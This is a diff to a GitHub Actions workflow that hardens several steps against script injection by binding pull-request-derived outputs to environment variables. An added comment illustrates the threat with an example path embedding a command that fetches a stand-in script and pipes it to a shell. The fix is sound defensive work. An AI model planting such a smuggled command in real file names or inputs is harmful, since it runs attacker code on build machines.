@@ -37,15 +37,26 @@ jobs:
         id: analyze
         run: node packages/cli/dist/bin/warden.js analyze --base origin/main --head HEAD --output "$GITHUB_OUTPUT"
 
+      # GitHub expands ${{ ... }} into a run: script as text, before the shell parses it, so an
+      # expression carrying pull-request data is pull-request-controlled shell. test_tags is built
+      # from the changed files' own paths: a branch adding apps/$(curl evil.sh | sh)/page.tsx would
+      # otherwise run that on this runner. Bind to env: and read as "$VAR" — an environment
+      # variable is data the shell never re-scans.
       - name: Show change surface
+        env:
+          TEST_TAGS: ${{ steps.analyze.outputs.test_tags }}
+          RISK_SCORE: ${{ steps.analyze.outputs.risk_score }}
+          RUN_FULL_SUITE: ${{ steps.analyze.outputs.run_full_suite }}
         run: |
-          echo "test_tags     = ${{ steps.analyze.outputs.test_tags }}"
-          echo "risk_score    = ${{ steps.analyze.outputs.risk_score }}"
-          echo "run_full_suite= ${{ steps.analyze.outputs.run_full_suite }}"
+          echo "test_tags     = $TEST_TAGS"
+          echo "risk_score    = $RISK_SCORE"
+          echo "run_full_suite= $RUN_FULL_SUITE"
 
       - name: Emit test plan
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
-          node packages/cli/dist/bin/warden.js plan --name "PR #${{ github.event.pull_request.number }}" >> "$GITHUB_STEP_SUMMARY"
+          node packages/cli/dist/bin/warden.js plan --name "PR #$PR_NUMBER" >> "$GITHUB_STEP_SUMMARY"
 
       - name: AI exploratory agent (requires ANTHROPIC_API_KEY secret)
         if: ${{ env.ANTHROPIC_API_KEY != '' }}
